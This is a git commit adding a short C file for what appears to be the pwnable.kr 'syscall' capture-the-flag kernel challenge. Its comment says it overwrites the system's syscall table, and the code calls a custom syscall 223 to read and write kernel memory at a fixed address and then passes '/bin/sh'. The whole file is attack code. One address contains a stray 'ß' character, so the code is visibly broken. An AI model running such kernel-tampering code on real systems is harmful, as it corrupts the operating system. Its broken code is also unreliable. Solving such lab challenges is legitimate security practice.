221b205f0b8c65ae4da295b14250beb50617a0d1
DragonTechRoyale <DragonTechRoyale@users.noreply.github.com>
2022-07-21 01:48:49 +0300

    fucked up syscall

---
+++ pwnable.kr/Rookiss/syscall/clean.c
@@ -0,0 +1,21 @@
+// Fucks up syscalling in the system by overwirting the syscall table
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+int main()
+{
+	unsigned int info[3000] = { 61 };
+	char * temp = (char *)malloc(3000);
+    syscall(223,(char *)(unsigned int *)0x8000ße348, (char *)info);
+    puts((char *)info);
+
+	syscall(223, (char *)info, (char *)(unsigned int *)0x8000e348);
+	syscall(223,(char *)(unsigned int *)0x8000e348, (char *)info);
+	puts((char *)info);
+	syscall(223, "/bin/sh", temp);
+	puts(temp);
+
+}
